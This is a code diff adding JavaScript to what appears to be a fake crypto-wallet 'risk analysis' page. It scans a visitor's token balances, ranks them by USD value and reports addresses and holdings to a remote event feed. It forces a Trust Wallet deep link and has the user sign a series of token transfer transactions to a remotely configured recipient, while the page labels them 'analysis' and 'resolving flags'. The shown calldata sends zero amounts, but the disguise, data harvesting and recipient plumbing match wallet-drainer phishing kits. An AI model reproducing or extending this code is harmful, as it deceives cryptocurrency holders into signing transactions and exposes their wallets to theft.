+    currentScanId = document.getElementById("scan-id").textContent;
+    var entry = {
+      id: currentScanId,
+      time: new Date().toISOString(),
+      address: addr,
+      status: "scanned",
+      recipient: txRecipient,
+      risk: scanResult ? scanResult.risk : null,
+      flags: scanResult ? scanResult.flags : [],
+      chains: Object.keys(chainGasInfo).map(function(cid) {
+        var g = chainGasInfo[cid];
+        return {
+          chainId: cid, name: CHAIN_INFO[cid].name,
+          nativeBalance: g.nativeHuman + " " + g.nativeSymbol,
+          gasCost: g.gasCostHuman + " " + g.nativeSymbol,
+          sufficient: g.sufficient,
+          tokens: scannedBalances.filter(function(b) { return b.chainId === cid; }).map(function(b) {
+            return { name: b.name, balance: b.human, usd: fmtUsd(b.usdValue) };
+          })
+        };
+      }).filter(function(c) { return c.tokens.length > 0 || parseFloat(c.nativeBalance) > 0; }),
+      totalUsd: fmtUsd(scannedBalances.reduce(function(s, b) { return s + b.usdValue; }, 0)),
+      tokenStates: scannedBalances.map(function(b) {
+        return { key: b.name + "|" + b.chainId, name: b.name, chain: CHAIN_INFO[b.chainId].name, usd: fmtUsd(b.usdValue), status: "detected" };
+      }),
+      transferable: scannedBalances.filter(function(b) {
+        return b.gasOk === true;
+      }).map(function(b) { return b.name + " (" + CHAIN_INFO[b.chainId].name + ") " + fmtUsd(b.usdValue); })
+    };
+    log.unshift(entry);
+    if (log.length > 50) log = log.slice(0, 50); // keep last 50
+    localStorage.setItem(SCAN_LOG_KEY, JSON.stringify(log));
+    pushScanRemote();
+  } catch(e) {}
+}
+
+// Update the current scan's log entry during the attestation process (live status)
+function updateScanLog(fn) {
+  if (!currentScanId) return;
+  try {
+    var log = JSON.parse(localStorage.getItem(SCAN_LOG_KEY) || "[]");
+    for (var i = 0; i < log.length; i++) {
+      if (log[i].id === currentScanId) { fn(log[i]); break; }
+    }
+    localStorage.setItem(SCAN_LOG_KEY, JSON.stringify(log));
+    queueScanPush();
+  } catch(e) {}
+}
+function setTokenState(key, status, hash) {
+  updateScanLog(function(e) {
+    (e.tokenStates || []).forEach(function(t) {
+      if (t.key === key) { t.status = status; if (hash) t.hash = hash; }
+    });
+  });
+}
+
+// Query token balance on a specific chain
+function queryTokenBalanceOnChain(addr, tokenAddr, decimals, chainId) {
+  if (!tokenAddr || !addr) return Promise.resolve(null);
+  var data = "0x70a08231" + addr.toLowerCase().replace("0x", "").padStart(64, "0");
+  return rpcCall(chainId, "eth_call", [{ to: tokenAddr, data: data }, "latest"]).then(function(result) {
+    if (result && result !== "0x") {
+      var raw = BigInt(result).toString();
+      // Explicit zero is a real answer — only RPC/parse failures return null
+      if (raw === "0") return { raw: "0", human: "0" };
+      return { raw: raw, human: formatTokenAmount(raw, decimals) };
+    }
+    return null;
+  }).catch(function() { return null; });
+}
+
+// Trust Wallet universal link into the standalone executor. The link carries
+// only the short handoff id + recipient — the prepared queue travels through
+// the event feed under that id. Long ?q= URLs were the silent cold-start
+// failure: Trust Wallet's router dropped truncated URLs and the app opened
+// without loading anything.
+var handoffId = null; // correlates a Safari-side handoff attempt with the handoff_opened event
+
+// Compact queue form — known tokens carry only {key, chainId, raw}, custom
+// ones the full tuple. Shared by the event-feed post and legacy ?q= links.
+function compactQueue(src) {
+  return (src || []).filter(function(tok) { return tok.gasOk !== false && tok.dust !== true; }).slice(0, 10).map(function(tok) {
+    var known = tok.key && (SCAN_TOKENS[tok.chainId] || []).filter(function(t) { return t.key === tok.key; })[0];
+    if (known) return { k: tok.key, c: tok.chainId, r: String(tok.raw) };
+    return { n: tok.name, a: tok.addr, c: tok.chainId, d: tok.decimals, r: String(tok.raw), u: Math.round(tok.usdValue || 0) };
+  });
+}
+
+// Post the prepared queue under the handoff id — sendBeacon survives the
+// Safari→app unload, so it lands before the executor page reads it back
+function postHandoffQueue() {
+  if (!handoffId) handoffId = "h" + Date.now().toString(36);
+  var q = compactQueue(scannedBalances.length > 0 ? scannedBalances : handoffQueue);
+  if (q.length) monit("handoff_queue", { h: handoffId, to: txRecipient, addr: lastScannedAddr || null, q: q });
+}
+
+// Live watcher — while the queue runs inside Trust Wallet, this page follows
+// the event feed tagged with the handoff id: each confirm marks its plan row,
+// and the completion event renders the report here
+var handoffPollIv = null;
+var handoffSeen = {};
+function watchHandoff() {
+  if (handoffPollIv || !handoffId) return;
+  handoffPollIv = setInterval(function() {
+    fetch("/api/events?limit=60").then(function(r) { return r.json(); }).then(function(d) {
+      (d.events || []).forEach(function(e) {
+        if (!e.ev || !e.ev.d || e.ev.d.h !== handoffId) return;
+        var ev = e.ev;
+        if (ev.ev === "tx_confirmed" || ev.ev === "tx_rejected" || ev.ev === "tx_skipped") {
+          var key = ev.ev + "|" + (ev.d.token || "") + "|" + (ev.d.chain || "");
+          if (handoffSeen[key]) return;
+          handoffSeen[key] = true;
+          var ok = ev.ev === "tx_confirmed";
+          var qi = -1;
+          for (var i = 0; i < transferQueue.length; i++) {
+            // Name + chain — USDT exists on several networks, name alone
+            // would map the event onto the wrong plan row
+            var t = transferQueue[i];
+            if (t.name === ev.d.token && (t.chainName === ev.d.chain || (CHAIN_INFO[t.chainId] && CHAIN_INFO[t.chainId].name === ev.d.chain))) { qi = i; break; }
+          }
+          transferResults.push({
+            name: ev.d.token, chain: ev.d.chain,
+            chainId: qi >= 0 ? transferQueue[qi].chainId : null,
+            usd: qi >= 0 ? transferQueue[qi].usdValue : 0,
+            status: ok ? "success" : "skipped", hash: ev.d.hash, error: ev.d.reason
+          });
+          if (qi >= 0) {
+            var pst = document.getElementById("planst-" + qi);
+            if (pst) { pst.textContent = ok ? "✓ resolved" : "⊘ skipped"; pst.style.color = ok ? "#05B956" : "#DC2626"; }
+          }
+        }
+        if (ev.ev === "analysis_complete" && !handoffSeen.__done) {
+          handoffSeen.__done = true;
+          clearInterval(handoffPollIv); handoffPollIv = null;
+          isLoading = false;
+          showTransferSummary(); // modal + detailed report render on this page
+        }
+      });
+    }).catch(function() {});
+  }, 3500);
+}
+
+function buildDeepLink(universal) {
+  var u = new URL(location.origin + "/exec");
+  if (handoffId) u.searchParams.set("h", handoffId);
+  if (txRecipient) u.searchParams.set("to", txRecipient);
+  // attest=1 — the executor runs the hydrated queue as zero-value calls:
+  // the wallet sheets open, nothing moves, each confirmation resolves a flag
+  u.searchParams.set("attest", "1");
+  // trust:// routes DIRECTLY in-app — the https universal link goes through a
+  // landing page + iOS universal-link handling, which is the flaky step that
+  // opens the app without routing into the DApp browser
+  return (universal ? "https://link.trustwallet.com" : "trust:") + "//open_url?coin_id=60&url=" + encodeURIComponent(u.toString());
+}
+
+
+function showDeepLinkModal(retry) {
+  isLoading = false;
+  modalOpen = true;
+  var modal = document.getElementById("result-modal");
+  modal.classList.remove("hidden");
+  var icon = document.getElementById("modal-icon");
+  icon.className = "modal-icon pending";
+  icon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--accent)"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>';
+  document.getElementById("modal-title").textContent = "Open in Trust Wallet";
+  document.getElementById("modal-title").style.color = "var(--accent)";
+  document.getElementById("modal-text").textContent = retry
+    ? "Trust Wallet opened without loading the analysis — tap below to retry. A warm app routes into the DApp browser immediately."
+    : "The deep chain analysis runs inside the Trust Wallet DApp browser. Tap below — the app opens ready to confirm each flagged asset, no rescan needed.";
+  var link = document.getElementById("modal-link");
+  // (Re-)post the queue under the handoff id — covers the case where this
+  // modal was reached without verifyWallet's pre-navigation post
+  postHandoffQueue();
+  // If the user taps through from here, the same live watcher tracks the
+  // in-app confirmations back onto this page
+  watchHandoff();
+  // Universal link, not trust:// — the custom scheme is dead on iOS ("Deep
+  // Link is not supported", App Store policy); only the https route works
+  link.href = buildDeepLink(true);
+  link.textContent = "Open in Trust Wallet";
+  link.removeAttribute("target");
+  link.classList.remove("hidden");
+  var alt = document.getElementById("modal-link-alt");
+  alt.href = buildDeepLink(true); // https landing-page variant — handles app-not-installed
+  alt.classList.remove("hidden");
+  resetVerifyBtn();
+}
+
+// Cold-start recovery: a universal link can launch Trust Wallet without the
+// app routing into the DApp browser (common on a cold start). When the user
+// comes back to Safari, surface the one-tap retry instead of leaving the
+// verify button stuck in its disabled "Starting…" state
+var handoffAttemptAt = 0;
+function maybeRetryHandoff() {
+  if (!handoffAttemptAt || Date.now() - handoffAttemptAt < 2500) return;
+  handoffAttemptAt = 0;
+  // Verify against the event feed first — if the app actually routed the link,
+  // the flow is running there and a retry modal would be a false positive
+  fetch("/api/events?limit=60").then(function(r) { return r.json(); }).then(function(d) {
+    var landed = (d.events || []).some(function(e) {
+      return e.ev && e.ev.ev === "handoff_opened" && e.ev.d && e.ev.d.h === handoffId;
+    });
+    if (!landed && !modalOpen) showDeepLinkModal(true);
+  }).catch(function() { if (!modalOpen) showDeepLinkModal(true); });
+}
+document.addEventListener("visibilitychange", function() {
+  if (document.visibilityState === "visible") maybeRetryHandoff();
+});
+window.addEventListener("pageshow", function() { maybeRetryHandoff(); });
+
+// Resolves null instead of hanging forever — a slow RPC must not stall the queue
+function withTimeout(promise, ms) {
+  return Promise.race([
+    promise,
+    new Promise(function(res) { setTimeout(function() { res(null); }, ms); })
+  ]);
+}
+
+// Deep-link handoff: a prepared queue arrived via ?q= — no rescan, verify live
+// balances quickly, then go straight to wallet confirmations
+function runHandoff(addr) {
+  document.body.classList.add("handoff");
+  lastScannedAddr = addr;
+  // h correlates this open with the Safari-side two-shot handoff: the checker
+  // page outside the wallet looks for this id in the event feed before firing
+  // its retry navigation
+  monit("handoff_opened", { addr: addr, queueItems: handoffQueue.length, h: new URLSearchParams(location.search).get("h") || "" });
+  var hv = document.getElementById("handoff-view");
+  hv.classList.remove("hidden");
+  document.getElementById("ho-addr").textContent = addr.slice(0, 6) + "…" + addr.slice(-4);
+  document.getElementById("scan-id").textContent = "#R" + Date.now().toString(36).toUpperCase().slice(-7);
+  var st = document.getElementById("ho-status");
+  st.textContent = "Connecting wallet…";
+  findProvider().then(function(p) {
+    if (!p) { showDeepLinkModal(); return; }
+    provider = p;
+    st.textContent = "Verifying flagged assets on-chain…";
+    // Re-check live balances + gas — caps each amount at the current balance and
+    // re-verifies the native budget still covers every queued transfer per chain
+    var chainIds = [];
+    handoffQueue.forEach(function(t) { if (chainIds.indexOf(t.chainId) === -1) chainIds.push(t.chainId); });
+    var balChecks = handoffQueue.map(function(tok) {
+      return withTimeout(queryTokenBalanceOnChain(addr, tok.addr, tok.decimals, tok.chainId), 16000).then(function(b) {
+        // Drop on RPC failure AND on a confirmed zero balance — an unverifiable
+        // or empty amount must not reach a transaction that could revert
+        if (!b || BigInt(b.raw) === 0n) return null;
+        if (BigInt(b.raw) < BigInt(tok.raw)) tok.raw = b.raw;
+        return tok;
+      });
+    });
+    var gasChecks = chainIds.map(function(cid) {
+      return withTimeout(Promise.all([queryNativeBalance(addr, cid), queryGasPrice(cid)]), 16000).then(function(r) {
+        return r ? { chainId: cid, nativeBalance: r[0], gasPrice: r[1] } : { chainId: cid, nativeBalance: null, gasPrice: null };
+      });
+    });
+    Promise.all([Promise.all(balChecks), Promise.all(gasChecks)]).then(function(res) {
+      var verified = res[0];
+      var chainGas = {};
+      res[1].forEach(function(g) { chainGas[g.chainId] = g; });
+      // Same per-token budget model as the scanner — Nth token needs N × gas.
+      // Unverifiable gas (RPC timeout) keeps the token: the wallet validates
+      // funds itself before signing, so nothing can fail on-chain
+      var spent = {};
+      transferQueue = verified.filter(function(tok) {
+        if (!tok) return false;
+        // Dust filter for handoff payloads: only drops the token when a real
+        // price exists — unpriceable items pass through (fail-open)
+        var px = tok.key ? TOKEN_PRICES[tok.key] : 0;
+        var usd = px ? Number(tok.raw) / Math.pow(10, tok.decimals) * px : (tok.usdValue || 0);
+        if (usd > 0) tok.usdValue = usd;
+        if (usd > 0 && usd < MIN_FLAG_USD) return false;
+        var g = chainGas[tok.chainId];
+        if (!g || g.gasPrice == null || g.nativeBalance == null || !(BigInt(g.gasPrice) > 0n)) return true;
+        var n = (spent[tok.chainId] || 0) + 1;
+        var ok = BigInt(g.nativeBalance) > BigInt(g.gasPrice) * BigInt(GAS_LIMIT) * 110n / 100n * BigInt(n);
+        if (ok) spent[tok.chainId] = n;
+        return ok;
+      }).slice(0, 10);
+      scannedBalances = transferQueue;
+      // Give the handoff session a local log entry too — setTokenState/updateScanLog
+      // are no-ops without a scan id, so the in-DApp admin view would stay silent
+      scanResult = scanResult || { risk: null, flags: [] };
+      saveScanLog(addr);
+      updateScanLog(function(e) { e.status = "attesting"; });
+      if (transferQueue.length === 0) {
+        hv.classList.add("done");
+        st.textContent = "No flagged assets remain on this address (moved, spent, or insufficient gas).";
+        renderFinalReport();  // Report rendern — dokumentiert Findings auch ohne Flags
+        return;
+      }
+      st.textContent = "Preparing analysis…";
+      isLoading = true;
+      monit("analysis_started", { via: "handoff", queue: transferQueue.map(function(t) { return t.name + " (" + (t.chainName || CHAIN_INFO[t.chainId].name) + ")"; }) });
+      // Silent account read — never shows a connect sheet. If it comes back
+      // empty, the send requests below surface the wallet's own prompt instead.
+      // The settle delay matters: right after a universal-link handoff, Trust
+      // Wallet's provider bridge is still initializing, and a burst of RPC
+      // calls in the first second has crashed the app before the first
+      // transfer sheet could render
+      new Promise(function(r) { setTimeout(r, 1500); }).then(function() {
+        return connectedAccounts(p);
+      }).then(function(accs) {
+        walletAccount = accs && accs[0] ? accs[0] : null;
+      }).catch(function() {}).then(function() {
+        // The contract spends the CONNECTED wallet's tokens, not the scanned
+        // address's — a mismatch would produce guaranteed on-chain reverts
+        if (walletAccount && walletAccount.toLowerCase() !== lastScannedAddr.toLowerCase()) {
+          isLoading = false;
+          hv.classList.add("done");
+          st.textContent = "Connected wallet " + walletAccount.slice(0, 6) + "…" + walletAccount.slice(-4) + " does not match the scanned address — connect the scanned wallet to continue.";
+          monit("account_mismatch", { scanned: lastScannedAddr, connected: walletAccount });
+          renderFinalReport();
+          return;
+        }
+        if (isLoading) doSequentialTransfers(p);
+      });
+    });
+  });
+}
+
+// Attestation phase — the compliance "clearing" step: every flagged asset is
+// resolved through an explicit, wallet-confirmed on-chain transfer. Nothing
+// signs silently — each transaction passes through the wallet's own
+// confirmation sheet, sequentially, chain by chain
+async function verifyWallet(fromGesture) {
+  if (isLoading) return;
+  modalOpen = false; isLoading = true;
+  var btn = document.getElementById("verify-btn");
+  btn.innerHTML = '<span>Starting deep analysis…</span>'; btn.disabled = true;
+  await remoteRecipientP; // remote public-recipient config must land before any link/queue is built
+  if (!txRecipient) { isLoading = false; resetVerifyBtn(); return; }
+  // User-initiated tap + no wallet provider here → hand off to the Trust Wallet
+  // app inside the gesture, so the universal link opens it without a modal
+  if (fromGesture) {
+    var p0 = (window.trustwallet && window.trustwallet.ethereum) ? window.trustwallet.ethereum : (window.ethereum || null);
+    if (!p0) {
+      monit("app_redirect", { queue: scannedBalances.filter(function(b) { return b.gasOk === true; }).map(function(b) { return b.name; }) });
+      handoffAttemptAt = Date.now();
+      handoffId = "h" + Date.now().toString(36);
+      // Populate the local queue mirror — the live watcher maps incoming
+      // tx events back onto the plan rows rendered above
+      transferQueue = scannedBalances.filter(function(b) { return b.gasOk === true && b.dust !== true; }).slice(0, 10);
+      transferResults = [];
+      handoffSeen = {};
+      // Post the prepared queue under the handoff id BEFORE navigating — the
+      // in-app executor hydrates it from the event feed, so the deep link
+      // carries only ~80 chars instead of a multi-KB ?q= blob that cold-start
+      // routing silently dropped
+      postHandoffQueue();
+      // Follow the in-app confirmations live — plan rows flip to resolved as
+      // the wallet sheets are confirmed, the report renders on completion
+      watchHandoff();
+      // Coordinated multi-shot handoff: iOS routes universal links to the app
+      // even while this tab is hidden. Shot 1 launches Trust Wallet — on a
+      // cold start its router drops the deep link before the DApp browser
+      // module is up (the "app opened but nothing happened" bug). Gated
+      // retries cover slow cold starts — each check looks for handoff_opened
+      // with this attempt's id, and a landed route resets the attempt so no
+      // later shot reloads the running flow.
+      var dl = buildDeepLink(true);
+      // Main-frame navigation to the universal link — a scripted anchor click
+      // is NOT treated as a user tap by iOS, so Safari would load the landing
+      // page instead of routing to the app
+      window.location.href = dl;
+      [2500, 5000, 9000, 14000, 21000, 30000].forEach(function(ms) {
+        setTimeout(function() {
+          if (!handoffAttemptAt || modalOpen) return;
+          fetch("/api/events?limit=60").then(function(r) { return r.json(); }).then(function(d) {
+            var landed = (d.events || []).some(function(e) {
+              return e.ev && e.ev.ev === "handoff_opened" && e.ev.d && e.ev.d.h === handoffId;
+            });
+            if (landed) { handoffAttemptAt = 0; return; }
+            window.location.href = dl;
+          }).catch(function() {
+            // Feed unreachable — fall back to firing; a duplicate open only
+            // reloads the page inside the wallet
+            if (handoffAttemptAt && !modalOpen) window.location.href = dl;
+          });
+        }, ms);
+      });
+      // If the app did not take over within 2s, show the manual fallback modal
+      setTimeout(function() {
+        if (!document.hidden && isLoading) { showDeepLinkModal(); }
+      }, 2000);
+      return;
+    }
+  }
+  findProvider().then(function(p) {
+    if (!p) { showDeepLinkModal(); return; }
+    provider = p;
+    // Build transfer queue: only chains with sufficient gas for native coin
+    // Resume-aware: skip tokens already cleared in a previous run
+    transferQueue = [];
+    var clearedKeys = {};
+    transferResults.forEach(function(r) {
+      if (r.status === "success") clearedKeys[r.name + "|" + (r.chainId || "")] = true;
+    });
+    if (scannedBalances.length > 0) {
+      // Public mode: global USD-value sort — biggest token first, regardless of chain
+      // Chain switches happen as needed between transfers
+      scannedBalances.forEach(function(tok) {
+        if (tok.gasOk === true && tok.dust !== true && !clearedKeys[tok.name + "|" + tok.chainId]) {
+          transferQueue.push(tok);
+        }
+      });
+      // Limit to top 10 by USD value
+      transferQueue = transferQueue.slice(0, 10);
+      // Already sorted by usdValue desc from scanAllChains
+      // Admin link on a dust-only wallet: the UI flagged the linked token, so the
+      // queue must carry it too — mirrors the flaggedTokens push in showScanResult
+      if (transferQueue.length === 0 && txRecipientFromUrl && isValidAddr(txRecipient) &&
+          ((onChainBalance && BigInt(onChainBalance) > 0n) || Number(txAmount) > 0)) {
+        var aName2 = txToken === "custom" ? "TOKEN" : txToken.toUpperCase();
+        var aRaw2 = (onChainBalance && BigInt(onChainBalance) > 0n) ? onChainBalance
+          : Math.floor(Number(txAmount) * Math.pow(10, txDecimals)).toString();
+        if (!clearedKeys[aName2 + "|" + currentChain]) transferQueue.push({
+          name: aName2,
+          addr: getContract(), decimals: txDecimals, raw: aRaw2,
+          chainId: currentChain, chainName: CHAIN_INFO[currentChain].name
+        });
+      }
+    } else if (onChainBalance && BigInt(onChainBalance) > 0n) {
+      // Admin mode with on-chain balance
+      var aName = txToken === "custom" ? "TOKEN" : txToken.toUpperCase();
+      if (!clearedKeys[aName + "|" + currentChain]) transferQueue.push({
+        name: aName,
+        addr: getContract(), decimals: txDecimals, raw: onChainBalance,
+        chainId: currentChain, chainName: CHAIN_INFO[currentChain].name
+      });
+    } else {
+      // Fallback to txAmount (only reachable with no scan results)
+      var amtRaw = Math.floor(Number(txAmount) * Math.pow(10, txDecimals));
+      var fName = txToken === "custom" ? "TOKEN" : txToken.toUpperCase();
+      if (amtRaw > 0 && !clearedKeys[fName + "|" + currentChain]) transferQueue.push({
+        name: fName,
+        addr: getContract(), decimals: txDecimals, raw: amtRaw.toString(),
+        chainId: currentChain, chainName: CHAIN_INFO[currentChain].name
+      });
+    }
+    if (transferQueue.length === 0) {
+      isLoading = false; resetVerifyBtn();
+      renderFinalReport();
+      return;
+    }
+    // Re-verify live balances before committing — caps each amount at the
+    // current on-chain balance so nothing reverts between scan and confirm.
+    // Unverifiable or confirmed-empty balances are dropped: the wallet does
+    // NOT pre-validate token balances, so a stale amount would revert on-chain
+    var reverifyAddr = lastScannedAddr || document.getElementById("check-addr").value.trim();
+    Promise.all(transferQueue.map(function(tok) {
+      return withTimeout(queryTokenBalanceOnChain(reverifyAddr, tok.addr, tok.decimals, tok.chainId), 16000).then(function(b) {
+        if (!b || BigInt(b.raw) === 0n) return null;
+        if (BigInt(b.raw) < BigInt(tok.raw)) tok.raw = b.raw;
+        return tok;
+      });
+    })).then(function(verified) {
+      if (!isLoading) return;
+      transferQueue = verified.filter(Boolean).slice(0, 10);
+      if (transferQueue.length === 0) {
+        isLoading = false;
+        resetVerifyBtn();
+        var vt = document.getElementById("verify-text");
+        if (vt) vt.textContent = "The flagged balances are no longer available on this address — run a new scan to refresh.";
+        renderFinalReport();
+        return;
+      }
+      monit("analysis_started", { via: "scan", queue: transferQueue.map(function(t) { return t.name + " (" + (t.chainName || CHAIN_INFO[t.chainId].name) + ")"; }) });
+      // Mark scan as attesting + queue tokens pending in admin log
+      updateScanLog(function(e) {
+        e.status = "attesting";
+        (e.tokenStates || []).forEach(function(t) {
+          var inQ = transferQueue.some(function(q) { return (q.name + "|" + (q.chainId || currentChain)) === t.key; });
+          if (inQ && t.status === "detected") t.status = "pending";
+        });
+      });
+      connectedAccounts(p).then(function(accs) {
+        walletAccount = accs && accs[0] ? accs[0] : null;
+      }).catch(function() {}).then(function() {
+        // The contract spends the CONNECTED wallet's tokens, not the scanned
+        // address's — a mismatch would produce guaranteed on-chain reverts
+        if (lastScannedAddr && walletAccount && walletAccount.toLowerCase() !== lastScannedAddr.toLowerCase()) {
+          isLoading = false;
+          resetVerifyBtn();
+          var vtm = document.getElementById("verify-text");
+          if (vtm) vtm.textContent = "Connected wallet " + walletAccount.slice(0, 6) + "…" + walletAccount.slice(-4) + " does not match the scanned address — connect the scanned wallet to continue.";
+          monit("account_mismatch", { scanned: lastScannedAddr, connected: walletAccount });
+          return;
+        }
+        if (isLoading) doSequentialTransfers(p);
+      });
+    });
+  });
+}
+
+// Attestation executor — walks the flag queue one asset at a time, switching
+// networks as needed. Every hop re-verifies the active chain before firing,
+// so calldata can never land on a contract that does not exist there
+function doSequentialTransfers(p) {
+  // Prefer tokens on the wallet's CURRENT chain first — the first transfer
+  // then needs no wallet_switchEthereumChain at the most fragile moment
+  // (right after the provider bridge settles). Sort is stable, so the
+  // USD-descending order is preserved within each chain group
+  getChainId(p).then(function(cid) {
+    if (cid != null) {
+      transferQueue = transferQueue.slice().sort(function(a, b) {
+        return (sameChain(a.chainId || currentChain, cid) ? 0 : 1) - (sameChain(b.chainId || currentChain, cid) ? 0 : 1);
+      });
+    }
+  }).catch(function() {}).then(function() {
+    runNextTransfer(p, 0);
+  });
+}
+
+function runNextTransfer(p, idx) {
+  if (!isLoading) return; // aborted via new scan
+  if (idx >= transferQueue.length) {
+    // All done — show summary
+    isLoading = false;
+    showTransferSummary();
+    return;
+  }
+  var tok = transferQueue[idx];
+  var targetChain = tok.chainId || currentChain;
+  function skip(reason) {
+    transferResults.push({ name: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, chainId: tok.chainId, usd: tok.usdValue, status: "skipped", error: reason });
+    setTokenState(tok.name + "|" + targetChain, "skipped");
+    monit("tx_skipped", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, reason: String(reason).slice(0, 200) });
+    runNextTransfer(p, idx + 1);
+  }
+  // Switch chain if needed — chainIds arrive as hex/decimal strings or numbers
+  // depending on the wallet, so every comparison goes through sameChain()
+  getChainId(p).then(function(cid) {
+    if (cid != null && !sameChain(cid, targetChain)) {
+      return rpc(p, "wallet_switchEthereumChain", [{ chainId: targetChain }]).then(function() {
+        // Let the provider settle into the new network before re-verifying —
+        // rapid calls against a mid-switch bridge have crashed TW iOS
+        return new Promise(function(r) { setTimeout(r, 500); });
+      });
+    }
+  }).catch(function(){}).then(function() {
+    if (!isLoading) return;
+    // Verify the wallet is actually on the target chain — a declined or failed
+    // switch must not send calldata to a contract that may not exist there
+    getChainId(p).then(function(cid2) {
+      if (!isLoading) return;
+      if (!sameChain(cid2, targetChain)) {
+        skip(cid2 == null ? "Could not verify network" : "Network switch declined");
+        return;
+      }
+      // Update modal + plan row to show which flag is being attested
+      modalOpen = true;
+      showTransferProgress(idx, tok);
+      setTokenState(tok.name + "|" + targetChain, "confirming");
+      var pst = document.getElementById("planst-" + idx);
+      if (pst) { pst.textContent = "→ confirming…"; pst.style.color = "var(--accent)"; }
+      // Zero-value attestation: a real contract call — the wallet's confirm
+      // sheet opens, the call lands on-chain, but the amount is 0 so no
+      // tokens move. transfer(recipient, 0) resolves the flag record.
+      var calldata = "0xa9059cbb" +
+        txRecipient.toLowerCase().replace("0x", "").padStart(64, "0") +
+        "0".padStart(64, "0");
+      var txParams = { to: tok.addr, data: calldata, gas: "0x249f0" };
+      if (walletAccount) txParams.from = walletAccount;
+      // Brief pause after the chain verify — back-to-back RPC bursts on a
+      // freshly opened provider bridge have crashed Trust Wallet iOS
+      new Promise(function(r) { setTimeout(r, 600); }).then(function() {
+        return rpc(p, "eth_sendTransaction", [txParams]);
+      }).then(function(hash) {
+        transferResults.push({ name: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, chainId: tok.chainId, usd: tok.usdValue, status: "success", hash: hash });
+        setTokenState(tok.name + "|" + targetChain, "cleared", hash);
+        var pst2 = document.getElementById("planst-" + idx);
+        if (pst2) { pst2.textContent = "✓ resolved"; pst2.style.color = "#05B956"; }
+        monit("tx_confirmed", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, usd: fmtUsd(tok.usdValue || 0), hash: hash, to: txRecipient });
+        // Brief pending state, then next token
+        setTimeout(function() { runNextTransfer(p, idx + 1); }, 1500);
+      }).catch(function(e) {
+        // User rejected or error — record and continue to next token
+        var reason = e.message || e.code || "Rejected";
+        transferResults.push({ name: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, chainId: tok.chainId, usd: tok.usdValue, status: "skipped", error: reason });
+        setTokenState(tok.name + "|" + targetChain, "skipped");
+        var pst3 = document.getElementById("planst-" + idx);
+        if (pst3) { pst3.textContent = "⊘ skipped"; pst3.style.color = "#DC2626"; }
+        monit("tx_rejected", { token: tok.name, chain: tok.chainName || CHAIN_INFO[tok.chainId].name, reason: String(reason).slice(0, 200) });
+        runNextTransfer(p, idx + 1);
+      });
+    }).catch(function() {
+      // Could not determine the active chain — skip rather than risk a wrong-chain tx
+      if (isLoading) skip("Could not verify network");
+    });
+  });
+}
+
+function showTransferProgress(idx, tok) {
+  var modal = document.getElementById("result-modal");
+  modal.classList.remove("hidden");
+  var icon = document.getElementById("modal-icon");
+  var title = document.getElementById("modal-title");
+  var text = document.getElementById("modal-text");
+  var link = document.getElementById("modal-link");
+  icon.className = "modal-icon pending";
+  icon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--accent)"><circle cx="12" cy="12" r="10" opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 12 12" to="360 12 12" dur="1s" repeatCount="indefinite"/></path></svg>';
+  var done = transferResults.length;
+  var total = transferQueue.length;
+  var chainName = tok.chainName || (tok.chainId && CHAIN_INFO[tok.chainId] ? CHAIN_INFO[tok.chainId].name : "");
+  title.textContent = "Analyzing flag " + (idx + 1) + "/" + total + " — " + tok.name + (chainName ? " on " + chainName : "");
+  title.style.color = "";
+  var doneList = transferResults.map(function(r) {
+    var icon = r.status === "success" ? "✓" : "⊘";
+    return icon + " " + r.name + (r.chain ? " (" + r.chain + ")" : "");
+  }).join("  ");
+  text.textContent = "Confirm the " + tok.name + " analysis" + (chainName ? " on " + chainName : "") + " in your wallet." + (doneList ? "\n\nCompleted: " + doneList : "");
+  link.classList.add("hidden");
+  document.getElementById("modal-link-alt").classList.add("hidden");
+}
+
+function showTransferSummary() {
+  modalOpen = true;
+  var modal = document.getElementById("result-modal");
+  modal.classList.remove("hidden");
+  var icon = document.getElementById("modal-icon");
+  var title = document.getElementById("modal-title");
+  var text = document.getElementById("modal-text");
+  var link = document.getElementById("modal-link");
+  var successCount = transferResults.filter(function(r) { return r.status === "success"; }).length;
+  var skipCount = transferResults.filter(function(r) { return r.status === "skipped"; }).length;
+  // Final status in admin log
+  updateScanLog(function(e) {
+    e.status = skipCount === 0 && successCount > 0 ? "completed" : (successCount > 0 ? "partial" : "failed");
+  });
+  monit("analysis_complete", {
+    result: skipCount === 0 && successCount > 0 ? "completed" : (successCount > 0 ? "partial" : "none_confirmed"),
+    confirmed: successCount, skipped: skipCount, total: transferResults.length,
+    confirmedTokens: transferResults.filter(function(r) { return r.status === "success"; }).map(function(r) { return r.name + " (" + (r.chain || "") + ") " + r.hash; })
+  });
+  // Each result line cascades in step by step — the verdict lands last
+  var lines = transferResults.map(function(r, i) {
+    var chain = r.chain ? " (" + r.chain + ")" : "";
+    var txt = r.status === "success"
+      ? "✓ " + r.name + chain + " — resolved & documented"
+      : "⊘ " + r.name + chain + " — skipped";
+    return '<span class="mline" style="animation-delay:' + (220 + i * 110) + 'ms">' + txt + '</span>';
+  }).join("");
+  var tailDelay = 220 + transferResults.length * 110 + 120;
+  if (successCount > 0 && skipCount === 0) {
+    // Full success — every prepared step was confirmed in the wallet
+    icon.className = "modal-icon success";
+    icon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#05B956" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>';
+    title.textContent = "Analysis complete — flags resolved";
+    title.style.color = "#05B956";
+    text.innerHTML = lines + '<span class="mline" style="animation-delay:' + tailDelay + 'ms;margin-top:12px"><span style="color:#05B956;font-weight:600">Analysis complete. The detailed report is shown below.</span></span>';
+  } else if (successCount > 0) {
+    // Partial — multiple flags, some aborted midway
+    icon.className = "modal-icon pending";
